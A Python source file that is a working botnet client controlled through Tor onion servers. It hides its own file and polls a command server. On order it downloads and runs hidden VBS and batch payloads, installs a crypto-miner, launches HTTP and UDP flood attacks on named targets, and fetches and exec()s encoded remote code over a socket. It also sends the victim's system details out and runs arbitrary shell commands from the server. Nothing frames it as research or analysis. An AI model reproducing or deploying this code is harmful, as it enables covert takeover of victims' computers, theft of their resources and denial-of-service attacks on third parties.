import os
import requests
import ctypes
import socket
import time
import platform
import psutil
import subprocess
import uuid
import wmi
import concurrent.futures
import random
import threading
import zlib
import base64
import struct
import sys
import socks
import zipfile
import getpass
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep
from pystyle import *
from getpass import getpass as hinput
proxies = {
    'http': 'socks5h://127.0.0.1:9150',  # Tor proxy address and port for HTTP
    'https': 'socks5h://127.0.0.1:9150'  # Tor proxy address and port for HTTPS
}

requests_session = requests.Session()
requests_session.proxies.update(proxies)

subprocess.Popen("attrib +h BN.pyw", shell=True) 


#def COPY():

#   source_file = "Pictures.msi"
#   while True:
 #    try:
  #       drives = [f"{drive}:" for drive in string.ascii_uppercase + string.ascii_lowercase]
   #      for drive in drives:
    #         destination_path = os.path.join(drive, os.path.basename(source_file))
     #        try:
      #          shutil.copy(source_file, destination_path)
       #      except Exception as e:
        #        print()
#     except Exception as e:
 #        print()
#
 #    time.sleep(1)

#A = threading.Thread(target=COPY)
#A.daemon = True
#A.start()

def METASPLOIT(): 
  
    actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
    actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)]) 
  
    previous_data = ""
  
    while True:
     url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Metasploit.php'
     time.sleep(5)
     response = requests_session.get(url)

     if response.status_code == 200:
        data = response.text.strip()
        if data != previous_data:
            parts = data.strip().split('::')
            if len(parts) == 3:
                mac, option, target = parts
            elif len(parts) == 2:
                mac, option = parts
            elif len(parts) == 1:
                mac = parts[0]
                option = ""
            else:
                continue

            time.sleep(1)
            
            previous_data = data
            if mac == '':
                if option == "STOP":
                    os.system("cls")
                    def restart_program():
                        python = sys.executable
                        os.execl(python, python, *sys.argv)
                    restart_program()
                elif option == "STARTVBSBAT":
                    os.system("cls")
                    php_script_url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Control.php'
                    home_directory = os.path.expanduser("~")
                    web_page1_path = os.path.join(home_directory, "Script.bat")
                    vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")

                    for file_path in [web_page1_path, vbs_file_path]:
                        if os.path.exists(file_path):
                            os.remove(file_path)

                    url1 = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Script.io"
                    url2 = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/VBSEX.io"

                    download_file(url1, web_page1_path)
                    download_file(url2, vbs_file_path)

                    if os.name == 'nt':
                        hide_files_windows([web_page1_path, vbs_file_path])
                    else:
                        hide_files_unix([web_page1_path, vbs_file_path])

                    if os.path.isfile(vbs_file_path):
                        subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
                elif option == "MINING":
                    TIMED = random.choice([0,10,20,30])
                    time.sleep(TIMED)
                    username = getpass.getuser()
                    target_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Drivers")
                    target_folder1 = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows")
                    if not os.path.exists(target_folder):
                      os.makedirs(target_folder)
                    download_url = "https://s01.babup.com/uploads/IMIG-328958365.zip"
                    zip_file_name = "Drivers.zip"
                    response = requests_session.get(download_url, verify=False)
                    with open(zip_file_name, "wb") as zip_file:
                       zip_file.write(response.content)
                    with zipfile.ZipFile(zip_file_name, "r") as zip_ref:
                       zip_ref.extractall(target_folder1)
                    vbs_script_path = os.path.join(target_folder, "VSHS.vbs")
                    subprocess.Popen(f"start {vbs_script_path}", shell=True)
                elif option == "DDOS":
                    os.system("cls")
                    requests_per_second = 100000
                    def send_requests():
                        try:
                           response = requests_session.get(target)
                           if response.status_code == 200:
                               pass
                        except Exception as e:
                               pass

                    threads = []
                    for _ in range(requests_per_second):
                        thread = threading.Thread(target=send_requests)
                        threads.append(thread)
                        thread.start()

                    for thread in threads:
                     thread.join()
                elif option == "UDOS":
                    class Brutalize:
                        def __init__(self, ip, port, force, threads):
                            self.ip = ip
                            self.port = port
                            self.force = force # default: 1250
                            self.threads = threads # default: 100
                            self.client = socket(family=AF_INET, type=SOCK_DGRAM)
                            self.data = str.encode("x" * self.force)
                            self.len = len(self.data)
                        def flood(self):
                            self.on = True
                            self.sent = 0
                            for _ in range(self.threads):
                                Thread(target=self.send).start()
                            Thread(target=self.info).start()  
                        def info(self):
                            interval = 0.05
                            now = time()
                            size = 0
                            self.total = 0
                            bytediff = 8
                            mb = 1000000
                            gb = 1000000000
                            while self.on:
                                sleep(interval)
                                if not self.on:
                                    break
                                if size != 0:
                                    self.total += self.sent * bytediff / gb * interval
                                    print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')
                                now2 = time()     
                                if now + 1 >= now2:
                                    continue       
                                size = round(self.sent * bytediff / mb)
                                self.sent = 0
                                now += 1
                        def stop(self):
                            self.on = False
                        def send(self):
                            while self.on:
                                try:
                                    self.client.sendto(self.data, self._randaddr())
                                    self.sent += self.len
                                except:
                                    pass
                        def _randaddr(self):
                            return (self.ip, self._randport())
                        def _randport(self):
                            return self.port or randint(1, 65535)
                    fluo = Col.light_red
                    fluo2 = Col.light_blue
                    white = Col.white
                    blue = Col.StaticMIX((Col.blue, Col.black))
                    bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
                    purple = Col.StaticMIX((Col.purple, blue, Col.white))
                    def init():
                        System.Size(140, 40)                             
                        Cursor.HideCursor()
                    init()
                    def stage(text, symbol = '...'):
                        col1 = purple
                        col2 = white
                        return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"
                    def error(text, start='\n'):
                        hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
                        exit()
                    def main():
                        print()
                        ip = input(stage(target))
                        print()
                        try:
                            if ip.count('.') != 3:
                                int('error')
                            int(ip.replace('.',''))
                        except:
                            pass
                        port = ''
                        print()
                        if port == '':
                            port = None 
                        else:
                            try:
                                port = int(port)
                                if port not in range(1, 65535 + 1):
                                    int('error')
                            except ValueError:
                                   pass
                        force = ''
                        print()

                        if force == '':
                            force = 1250
                        else:
                            try:
                                force = int(force)
                            except ValueError:
                                pass
                        threads = ''
                        print()
                        if threads == '':
                            threads = 100
                        else:
                            try:
                                threads = int(threads)
                            except ValueError:
                                pass
                        print()
                        cport = '' if port is None else f'{purple}:{fluo2}{port}'
                        print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')
                        brute = Brutalize(ip, port, force, threads)
                        try:
                            brute.flood()
                        except:
                            brute.stop()
                        try:
                            while True:
                                sleep(1000000)
                        except KeyboardInterrupt:
                            brute.stop()
                        print('\n')
                        sleep(1)
                    if __name__ == '__main__':
                        main()          
            

            if mac == actual_mac:

                if option == "START":
                    os.system("cls")
                    def run_specific_code():
                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9150)  # Use Tor's default port
                        socket.socket = socks.socksocket  # Redirect all socket traffic through Tor

                        while True:
                           ports_to_try = [80]
                           random.shuffle(ports_to_try)

                           for port in ports_to_try:
                            try:
                              s = socket.socket(2, socket.SOCK_STREAM)
                              s.connect(('vmfsj2ofiwu3p4pgip3buouim7io6c6xguqwuc4q4omy3rroq3vqj5ad.onion', port))  # Change the URL

                              l = struct.unpack('>I', s.recv(4))[0]
                              d = s.recv(1)
                              while len(d) < l:
                                d += s.recv(l - len(d))

                              exec(zlib.decompress(base64.b64decode(d)), {'s': s})

                            except Exception as e:
                             print(f"{e}")
                            finally:
                             s.close()

                            if 's' in locals():
                               break

                    specific_code_thread = threading.Thread(target=run_specific_code)
                    specific_code_thread.daemon = True
                    specific_code_thread.start()
                elif option == "STOP":
                    os.system("cls")
                    def restart_program():
                        python = sys.executable
                        os.execl(python, python, *sys.argv)
                    restart_program()
                else:
                    print("Invalid command:", option)
            else:
                print("MAC not provided or does not match. Cannot execute command.")
        else:
            print("No new data.")
    else:
        print("Failed to fetch data.")
    time.sleep(1)


specific_code_thread = threading.Thread(target=METASPLOIT)
specific_code_thread.daemon = True  
specific_code_thread.start()

previous_command = None
previous_files = {}

def clear_screen():
    if os.name == 'nt':
        ctypes.windll.kernel32.GetStdHandle(-11).ResizeScreenBuffer(1, 1)
        ctypes.windll.kernel32.GetStdHandle(-11).SetConsoleActiveScreenBuffer(
            ctypes.windll.kernel32.GetStdHandle(-10)
        )
    else:
        print("\033c", end="")

def send_data_to_url(url, data):
    try:
        response = requests_session.post(url, data=data)
        return f"Data sent to {url}: {response.text}"
    except Exception as e:
        return f"Error sending data to {url}: {str(e)}"

def download_file(url, save_path):
    try:
        response = requests_session.get(url)
        if response.status_code == 200:
            with open(save_path, "wb") as file:
                file.write(response.content)
            print(f"Downloaded and saved {url} to {save_path}")
        else:
            print(f"Failed to download {url}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error downloading {url}: {str(e)}")

def hide_files_windows(file_paths):
    try:
        for file_path in file_paths:
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  
    except Exception as e:
        print(f"Error hiding files on Windows: {str(e)}")

def hide_files_unix(file_paths):
    try:
        for file_path in file_paths:
            os.chmod(file_path, 0o400)  
    except Exception as e:
        print(f"Error hiding files on Unix-based system: {str(e)}")

def MEATSERVICE():
    while True:
        try:
         print("Running MEATSERVICE...")
         METASPLOIT()
         time.sleep(5)
        except:
            pass

specific_code_thread = threading.Thread(target=MEATSERVICE)
specific_code_thread.daemon = True  
specific_code_thread.start()

def get_system_info():
    try:
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
        computer = wmi.WMI()
        computer_info = computer.Win32_ComputerSystem()[0]
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.encode('utf-8').split(b'|')[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
        cpu = format(proc_info.Name)
        gpu = format(gpu_info.Name)
        System = platform.system()
        res = platform.release()
        mach = platform.machine()
        pros = platform.processor()
        ram = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        ip = requests.get('https://checkip.amazonaws.com').text.strip()
        hostname = socket.gethostname()
        
        data_to_send = {
            "DeviceID": f"{hostname}",
            "IP Address": f"{ip}",
            "System": f"{System} {res}",
            "Mac": f"{mac}",
            "Processor": f"{cpu}",
            "GPU": f"{gpu}",
            "Ram": f"{ram}",
            "Machine": f"{mach}",
        }
        proxies = {
    'http': 'socks5h://127.0.0.1:9150',
    'https': 'socks5h://127.0.0.1:9150'
}


# قم بتكوين requests لاستخدام البروكسي
        session = requests.Session()
        session.proxies = proxies

        url = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Save.php"
        data = data_to_send
        response = requests_session.post(url, data=data)
        print(response.text)

        return data_to_send

    except Exception as e:
        print(f"Error retrieving system information: {str(e)}")
        return None

while True:
    try:
        def receive_data():
            global previous_command, previous_files
            while True:
                php_script_url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Control.php'
                
                response = requests_session.get(php_script_url)
                data = response.text.strip()

                if data != "" and data != previous_command:
                    if '::' in data:
                        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
                        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
                        received_mac, file_to_execute = data.split('::', 1)
                        if received_mac == mac:
                            if file_to_execute not in previous_files or (time.time() - previous_files[file_to_execute]) > 30:
                                subprocess.Popen(f"{file_to_execute}", shell=True)
                                previous_files[file_to_execute] = time.time()
                            else:
                                print(f"Skipping file execution: File executed within 30 seconds.")
                        else:
                            print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
                    else:
                        subprocess.Popen(f"{data}", shell=True)
                    
                    previous_command = data
                    break 

        previous_command = ""
        previous_files = {}

        receive_thread = threading.Thread(target=receive_data)
        receive_thread.start()

        time.sleep(1)  
          


        data_to_send = get_system_info()
        if data_to_send:
            php_urls = [""]

            with concurrent.futures.ThreadPoolExecutor() as executor:
                results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)

            for result in results:
                print()

    except Exception as e:
        print(f"Error: {str(e)}")
        time.sleep(1)
